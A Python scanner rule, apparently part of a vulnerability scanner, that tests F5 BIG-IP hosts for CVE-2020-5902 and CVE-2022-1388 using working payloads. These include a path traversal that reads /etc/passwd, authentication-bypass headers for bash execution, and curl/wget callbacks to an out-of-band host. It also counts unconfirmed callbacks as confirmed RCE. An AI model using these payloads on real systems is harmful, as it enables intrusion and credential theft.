# Filename: VulnerabilityChecks/F5BigIPScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, TYPE_CHECKING, Set

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class F5BigIPAlert:
    cwe_id: int = 78
    wasc_id: int = 31
    name: str = "F5 BIG-IP Vulnerability"
    description: str = ""
    uri: str = ""
    attack_details: Dict[str, Any] = field(default_factory=dict)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Apply the latest security patches and updates from F5 for your BIG-IP version. "
        "Restrict network access to the BIG-IP management interface to trusted networks only. "
        "Regularly review F5 security advisories."
    )
    reference: str = ""
    risk: int = 4
    confidence: int = 2
    # Class level constants for confidence
    CONFIDENCE_HIGH: int = 3
    CONFIDENCE_MEDIUM: int = 2

    cve_id: Optional[str] = None
    oast_interaction_id: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A03": "Injection",
        "OWASP_2021_A06": "Vulnerable and Outdated Components",
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_interaction_id:
            tags["OAST_Interaction"] = "Detected"
        if self.cve_id:
            tags["CVE"] = self.cve_id
        
        return {
            "vulnerability_type": f"F5_BIG-IP_{self.cve_id.replace('-', '_') if self.cve_id else 'Generic'}",
            "type": self.name,
            "detail": self.description,
            "payload_used": str(self.attack_details.get("payload", "N/A"))[:200],
            "injection_point_info": self.attack_details.get("endpoint_attacked", "N/A"),
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info
        }

CVE_2020_5902_ID = "CVE-2020-5902"
CVE_2022_1388_ID = "CVE-2022-1388"
TMUI_BASE_PATH_TRAVERSAL = "/tmui/login.jsp/..;"
TMUI_FILE_READ_ENDPOINT = "/tmui/locallb/workspace/fileRead.jsp"
TMUI_CMD_EXEC_ENDPOINT_TMSH = "/tmui/locallb/workspace/tmshCmd.jsp"
TMUI_CMD_EXEC_ENDPOINT_PERL = "/tmui/locallb/workspace/scriptResult.jsp"
FILES_TO_READ_CVE20205902 = {
    "passwd": "/etc/passwd",
    "bigip_conf": "/config/bigip.conf",
    "hosts": "/etc/hosts"
}
COMMAND_ECHO_MARKER = "F5BIGIPRCETEST"
COMMANDS_TO_EXEC_CVE20205902 = {
    "id": "list /sys version",
    "echo": f"create /cli alias private custom_echo command \\\"bash -c echo {COMMAND_ECHO_MARKER}\\\"; list /cli alias private custom_echo"
}
ICONTROL_REST_BASH_ENDPOINT = "/mgmt/tm/util/bash"
ICONTROL_AUTH_BYPASS_HEADERS_VARIANTS = [
    {"Connection": "X-F5-Auth-Token", "X-F5-Auth-Token": "0", "Authorization": "Basic YWRtaW46"},
    {"Connection": "keep-alive, X-F5-Auth-Token", "X-F5-Auth-Token": "1", "Authorization": "Basic YWRtaW46"},
    {"Connection": "X-Forwarded-Host, X-F5-Auth-Token", "X-F5-Auth-Token": "a", "Authorization": "Basic YWRtaW46"},
]
ICONTROL_RCE_PAYLOAD_JSON = {"command": "run", "utilCmdArgs": ""}

class F5BigIPScanRule:
    tech_required: Set[str] = {"F5 BIG-IP"} # Specific to F5
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 15.0,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q # Store the queue
        
        if not self.oast_base_url:
            self.logger.info("F5 BIG-IP Scan: OAST base URL not configured. RCE confirmation will rely on echo/direct output.")

    def _normalize_oast_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else parsed.path.split('/')[0]

    def _get_oast_command(self, unique_id: str, os_type: str = "linux") -> str:
        if not self.oast_base_url:
            return f"echo {COMMAND_ECHO_MARKER}_{unique_id}"
        
        oast_target = f"{unique_id}.{self.oast_base_url}"
        if os_type == "linux":
            return f"(ping -c 1 {oast_target} || curl -m 3 http://{oast_target}/ping_fail || wget -T 3 -qO- http://{oast_target}/ping_fail_wget)"
        return f"echo OAST_CMD_FOR_{unique_id}_TO_{oast_target}"

    async def _send_f5_request(
        self,
        session: aiohttp.ClientSession,
        method: str, url: str,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Any] = None,
        json_payload: Optional[Dict[str, Any]] = None,
        allow_redirects: bool = False
    ) -> Tuple[Optional[Any], str, int]:
        
        current_headers = (headers or {}).copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        if data and isinstance(data, dict) and method.upper() == "POST" and not any(h.lower() == "content-type" for h in current_headers.keys()):
            current_headers["Content-Type"] = "application/x-www-form-urlencoded"
        
        self.logger.debug(f"F5 Scan: Sending {method} to {url}. JSON: {json_payload is not None}, Data: {data is not None}")
        
        text_content = ""
        status_code = -1
        resp_object_attrs = None

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(
                method.upper(), url, headers=current_headers, data=data, json=json_payload,
                timeout=timeout, allow_redirects=allow_redirects, ssl=False
            ) as resp:
                text_content = await resp.text(errors='replace')
                status_code = resp.status
                
                @dataclass
                class DetachedRespAttrs: status: int; headers: Dict; text: str
                resp_object_attrs = DetachedRespAttrs(status=resp.status, headers=dict(resp.headers), text=text_content)
        except Exception as e:
            self.logger.warning(f"F5 Scan: Request to {url} failed: {type(e).__name__} - {e}")
        
        return resp_object_attrs, text_content, status_code

    async def _queue_alert(self, alert_instance: F5BigIPAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put F5 BIG-IP alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in F5 BIG-IP rule, cannot queue alert.")

    async def _scan_cve_2020_5902(
        self, base_f5_url_obj: urllib.parse.ParseResult, session: aiohttp.ClientSession
    ) -> int: # Returns count of alerts generated
        alerts_generated_count = 0
        base_url_str = urllib.parse.urlunparse(base_f5_url_obj)

        for file_key, file_path in FILES_TO_READ_CVE20205902.items():
            attack_path = f"{TMUI_BASE_PATH_TRAVERSAL}{TMUI_FILE_READ_ENDPOINT}?fileName={urllib.parse.quote_plus(file_path)}"
            target_url = urllib.parse.urljoin(base_url_str, attack_path)
            
            _, resp_text, status = await self._send_f5_request(session, "GET", target_url)

            if status == 200 and resp_text:
                is_vuln = False
                evidence_str = f"Successfully read content from {file_path} via TMUI. Snippet: {resp_text[:200]}"
                if file_key == "passwd" and "root:" in resp_text: is_vuln = True
                elif file_key == "bigip_conf" and ("ltm virtual" in resp_text or "sys global-settings" in resp_text): is_vuln = True
                elif file_key == "hosts" and ("localhost" in resp_text or "127.0.0.1" in resp_text): is_vuln = True
                elif len(resp_text) > 10: 
                    is_vuln = True 
                    evidence_str = f"Successfully read non-empty content ({len(resp_text)} bytes) from {file_path} via TMUI. Snippet: {resp_text[:200]}"

                if is_vuln:
                    self.logger.info(f"F5 CVE-2020-5902: File read successful for {file_path} at {target_url}")
                    alert = F5BigIPAlert(
                        name=f"F5 BIG-IP TMUI Arbitrary File Read (CVE-2020-5902) - {file_key}",
                        description=f"The BIG-IP TMUI is vulnerable to path traversal (CVE-2020-5902), allowing unauthenticated attackers to read arbitrary files. File '{file_path}' was accessed.",
                        uri=base_url_str,
                        attack_details={"cve": CVE_2020_5902_ID, "type": "File Read", "endpoint_attacked": target_url, "payload": file_path},
                        evidence=evidence_str, cve_id=CVE_2020_5902_ID,
                        reference="https://support.f5.com/csp/article/K52145254",
                        confidence=F5BigIPAlert.CONFIDENCE_HIGH
                    )
                    await self._queue_alert(alert)
                    alerts_generated_count += 1
        
        unique_id_tmsh = str(uuid.uuid4())
        cmd_to_run_tmsh = self._get_oast_command(unique_id_tmsh) if self.oast_base_url else COMMANDS_TO_EXEC_CVE20205902.get("id", "list /sys version")
        attack_path_cmd = f"{TMUI_BASE_PATH_TRAVERSAL}{TMUI_CMD_EXEC_ENDPOINT_TMSH}?command={urllib.parse.quote_plus(cmd_to_run_tmsh)}"
        target_url_cmd = urllib.parse.urljoin(base_url_str, attack_path_cmd)
        _, resp_text_cmd, status_cmd = await self._send_f5_request(session, "GET", target_url_cmd)

        if status_cmd == 200 and resp_text_cmd:
            evidence_cmd = ""
            confirmed_rce = False
            if self.oast_base_url:
                evidence_cmd = f"OAST interaction attempt made via tmshCmd.jsp. Check OAST server for ID: {unique_id_tmsh}. Command: {cmd_to_run_tmsh}. Response snippet: {resp_text_cmd[:200]}"
                confirmed_rce = True
                self.logger.info(f"F5 CVE-2020-5902: RCE (OAST) attempt via tmshCmd.jsp. ID: {unique_id_tmsh}")
            elif COMMAND_ECHO_MARKER in cmd_to_run_tmsh and COMMAND_ECHO_MARKER in resp_text_cmd:
                evidence_cmd = f"Echo marker '{COMMAND_ECHO_MARKER}' found in response from tmshCmd.jsp. Command: {cmd_to_run_tmsh}. Response snippet: {resp_text_cmd[:200]}"
                confirmed_rce = True
                self.logger.info(f"F5 CVE-2020-5902: RCE (echo) confirmed via tmshCmd.jsp.")
            elif "version" in cmd_to_run_tmsh.lower() and ("version" in resp_text_cmd.lower() or "edition" in resp_text_cmd.lower()):
                 evidence_cmd = f"Command '{cmd_to_run_tmsh}' executed via tmshCmd.jsp, response suggests success. Snippet: {resp_text_cmd[:200]}"
                 confirmed_rce = True
                 self.logger.info(f"F5 CVE-2020-5902: RCE (info command) successful via tmshCmd.jsp.")

            if confirmed_rce:
                alert = F5BigIPAlert(
                    name="F5 BIG-IP TMUI Remote Command Execution (CVE-2020-5902)",
                    description=f"The BIG-IP TMUI is vulnerable to path traversal leading to RCE (CVE-2020-5902). An unauthenticated attacker can execute commands.",
                    uri=base_url_str,
                    attack_details={"cve": CVE_2020_5902_ID, "type": "RCE", "endpoint_attacked": target_url_cmd, "payload": cmd_to_run_tmsh},
                    evidence=evidence_cmd, cve_id=CVE_2020_5902_ID,
                    reference="https://support.f5.com/csp/article/K52145254",
                    confidence=F5BigIPAlert.CONFIDENCE_HIGH if COMMAND_ECHO_MARKER in evidence_cmd else F5BigIPAlert.CONFIDENCE_MEDIUM,
                    oast_interaction_id=unique_id_tmsh if self.oast_base_url and confirmed_rce else None
                )
                await self._queue_alert(alert)
                alerts_generated_count += 1
        return alerts_generated_count

    async def _scan_cve_2022_1388(
        self, base_f5_url_obj: urllib.parse.ParseResult, session: aiohttp.ClientSession
    ) -> int: # Returns count of alerts generated
        alerts_generated_count = 0
        base_url_str = urllib.parse.urlunparse(base_f5_url_obj)
        target_url = urllib.parse.urljoin(base_url_str, ICONTROL_REST_BASH_ENDPOINT.lstrip('/'))
        unique_id = str(uuid.uuid4())
        command_to_execute = self._get_oast_command(unique_id)
        
        rce_json_payload = ICONTROL_RCE_PAYLOAD_JSON.copy()
        rce_json_payload["utilCmdArgs"] = f"-c '{command_to_execute}'"

        for headers_variant in ICONTROL_AUTH_BYPASS_HEADERS_VARIANTS:
            current_headers = headers_variant.copy()
            current_headers["Content-Type"] = "application/json"
            
            _, resp_text, status = await self._send_f5_request(
                session, "POST", target_url, headers=current_headers, json_payload=rce_json_payload
            )

            if status == 200 and resp_text:
                evidence_rce = ""
                confirmed_vuln = False
                oast_id_for_alert = None
                try:
                    response_json = json.loads(resp_text)
                    command_result = response_json.get("commandResult", "")
                    
                    if self.oast_base_url:
                        evidence_rce = f"OAST interaction attempt made via iControl REST. Check OAST server for ID: {unique_id}. Command: {command_to_execute}. Response: {resp_text[:200]}"
                        confirmed_vuln = True
                        oast_id_for_alert = unique_id
                        self.logger.info(f"F5 CVE-2022-1388: RCE (OAST) attempt. ID: {unique_id}")
                    elif COMMAND_ECHO_MARKER in command_to_execute and COMMAND_ECHO_MARKER in command_result:
                        evidence_rce = f"Echo marker '{COMMAND_ECHO_MARKER}' found in iControl REST response. Command: {command_to_execute}. Result: {command_result[:200]}"
                        confirmed_vuln = True
                        self.logger.info(f"F5 CVE-2022-1388: RCE (echo) confirmed.")
                    elif command_result:
                        evidence_rce = f"Command executed via iControl REST, received output. Command: {command_to_execute}. Result: {command_result[:200]}"
                        confirmed_vuln = True
                        self.logger.info(f"F5 CVE-2022-1388: RCE (command output) confirmed.")
                except json.JSONDecodeError:
                    self.logger.debug(f"F5 CVE-2022-1388: Response from {target_url} was not valid JSON: {resp_text[:200]}")
                
                if confirmed_vuln:
                    alert = F5BigIPAlert(
                        name="F5 BIG-IP iControl REST Auth Bypass & RCE (CVE-2022-1388)",
                        description=(
                            "The BIG-IP iControl REST interface is vulnerable to an authentication bypass (CVE-2022-1388), "
                            "allowing unauthenticated attackers to execute arbitrary system commands."
                        ),
                        uri=base_url_str,
                        attack_details={
                            "cve": CVE_2022_1388_ID, "type": "AuthBypass_RCE", 
                            "endpoint_attacked": target_url, "payload": rce_json_payload,
                            "headers_used": current_headers
                        },
                        evidence=evidence_rce, cve_id=CVE_2022_1388_ID,
                        reference="https://support.f5.com/csp/article/K23605346",
                        confidence=F5BigIPAlert.CONFIDENCE_HIGH if COMMAND_ECHO_MARKER in evidence_rce or (self.oast_base_url and confirmed_vuln) else F5BigIPAlert.CONFIDENCE_MEDIUM,
                        oast_interaction_id=oast_id_for_alert
                    )
                    await self._queue_alert(alert)
                    alerts_generated_count += 1
                    break
        return alerts_generated_count

    async def scan(
        self,
        base_f5_url: str,
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_headers: Optional[Dict[str, str]] = None, 
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("F5 BIG-IP scan skipped: active_scan_async_q not configured.")
            return

        total_alerts_generated = 0
        try:
            parsed_base_f5_url = urllib.parse.urlparse(base_f5_url)
            if not parsed_base_f5_url.scheme or not parsed_base_f5_url.netloc:
                self.logger.error(f"F5 Scan: Invalid base_f5_url: {base_f5_url}")
                return
        except Exception as e:
            self.logger.error(f"F5 Scan: Could not parse base_f5_url '{base_f5_url}': {e}")
            return

        self.logger.info(f"Starting F5 BIG-IP vulnerability scan for: {base_f5_url}")

        try:
            alerts_cve2020 = await self._scan_cve_2020_5902(parsed_base_f5_url, aiohttp_session)
            total_alerts_generated += alerts_cve2020
            if any(alert.confidence == F5BigIPAlert.CONFIDENCE_HIGH for alert_dict in (self.active_scan_async_q._queue if self.active_scan_async_q else []) if (alert := alert_dict.get("alert")) and alert.get("cve_id") == CVE_2020_5902_ID): # Approximation
                 self.logger.info("F5 Scan: High confidence CVE-2020-5902 found.")
        except Exception as e:
            self.logger.error(f"F5 Scan: Error during CVE-2020-5902 check for {base_f5_url}: {e}", exc_info=True)

        try:
            alerts_cve2022 = await self._scan_cve_2022_1388(parsed_base_f5_url, aiohttp_session)
            total_alerts_generated += alerts_cve2022
            if any(alert.confidence == F5BigIPAlert.CONFIDENCE_HIGH for alert_dict in (self.active_scan_async_q._queue if self.active_scan_async_q else []) if (alert := alert_dict.get("alert")) and alert.get("cve_id") == CVE_2022_1388_ID): # Approximation
                 self.logger.info("F5 Scan: High confidence CVE-2022-1388 found.")
        except Exception as e:
            self.logger.error(f"F5 Scan: Error during CVE-2022-1388 check for {base_f5_url}: {e}", exc_info=True)
        
        if total_alerts_generated > 0:
            self.logger.info(f"F5 BIG-IP scan for {base_f5_url} completed. Generated {total_alerts_generated} potential alerts.")
        else:
            self.logger.info(f"F5 BIG-IP scan for {base_f5_url} completed. No alerts generated.")
        return